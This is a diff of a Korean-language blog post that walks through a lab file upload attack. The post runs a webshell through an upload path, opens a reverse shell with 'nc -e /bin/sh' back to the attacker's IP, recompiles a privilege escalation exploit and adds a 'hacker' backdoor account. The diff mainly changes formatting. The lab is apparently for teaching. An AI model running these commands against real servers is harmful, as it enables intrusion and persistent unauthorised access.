@@ -26,11 +26,12 @@ VMware [Edit]-[Virtual Network Editor]-[VMnet8] 에서 다음과 같이 설정�
 - DHCP Settings - starting ip address : 10.10.10.5
 - DHCP Settings - starting ip address : 10.10.10.254
 
+<center><p><img src="/assets/2019-01-28-post-file_upload_attack/1.jpg"></p></center>
+
 VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
 - 공격대상 서버의 IP : 10.10.10.10
 - 공격자 PC 의 IP : 10.10.10.1
 
-<center><p><img src="/assets/2019-01-28-post-file_upload_attack/1.jpg"></p></center>
 
 # 2. 파일 업로드 취약점 확인
 
@@ -66,7 +67,7 @@ VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
 
 > 3.3. Webshell 실행
 
-<2.2.> 에서 알아낸 파일 업로드 경로를 통해 다음의 url 을 통해 webshell 을 실행시킨다.
+<2.2. 파일 업로드 경로> 에서 알아낸 파일 업로드 경로를 참고하여 다음의 url 을 통해 webshell 을 실행시킨다.
 
 http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr
 
@@ -105,26 +106,27 @@ nobody 계정은 가장 권한이 낮은 계정 중 하나로, apache web server
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.7.4.png"></p></center>
 
 
-> ※ Expolit code 를 실행하였음에도, 권한상승에 실패한 이유?
+<div class="notice">
+※ Expolit code 를 실행하였음에도, 권한상승에 실패한 이유?
 
 웹쉘이란?  사실은 쉘이 아니다. 리눅스 쉘에 명령어를 전달하고 출력결과를 전달해주는 것으로 리눅스에서 쉘은 /bin/bash, /bin/sh 등이다. 실제 shell 을 통해 exploit 코드를 실행하여야 한다.
-
+</div>
 
 
 # 4. nc 를 이용한 reverse connection
 
 > 4.1. 공격 대상 PC 에서 nc 프로그램을 연결대기 상태로 만든다.
 
-cmd 창을 2개를 생성 후 다음과 같은 명령어를 입력한다.
-cmd_1 : nc -l -p 31337, 31337 포트를 이용한 프로그램 실행 중 상태 (31337 포트는 임의로 선택한 것이다.)
-cmd_2 : netstat -an, 31337 포트가 리스팅 상태인지(프로그램이 제대로 실행되었는지) 확인
+cmd 창을 2개 생성 후 다음과 같이 명령어를 입력한다.<br>
+`cmd_1` : nc -l -p 31337, 31337 포트를 이용한 프로그램 실행 중 상태 (31337 포트는 임의로 선택한 것이다.)<br>
+`cmd_2` : netstat -an, 31337 포트가 리스팅 상태인지(프로그램이 제대로 실행되었는지) 확인
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.1.jpg"></p></center>
 
 > 4.2. 웹쉘을 통해 서버 -> 공격대상 PC 연결시킨다.
 
-웹쉘 : nc -e /bin/sh 10.10.10.1 31337 (이때, 10.10.10.1 은 공격자의 IP 주소이다.)
-cmd_1 : id (연결확인)
+`웹쉘` : nc -e /bin/sh 10.10.10.1 31337 (이때, 10.10.10.1 은 공격자의 IP 주소이다.)<br>
+`cmd_1` : id (연결확인)
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.2.png"></p></center>
 
@@ -132,15 +134,19 @@ cmd_1 : id (연결확인)
 
 > 5.1. 이전에 컴파일 된, exp 를 삭제하고, nc(/bin/sh) 를 통해 exploit 코드를 재컴파일 후 실행시킨다.
 
+<div class="notice">
 ※ root 권한의 계정으로 컴파일 된 실행파일을 만들기 위함
+</div>
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/5.1.jpg"></p></center>
 
 > 5.2. hacker 계정 추가
 
-useradd hacker
-passwd hacker
-cat /etc/passwd (hacker 계정 추가 확인) 
+```
+useradd hacker<br>
+passwd hacker<br>
+cat /etc/passwd (hacker 계정 추가 확인)
+```
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/5.2.png"></p></center>
 
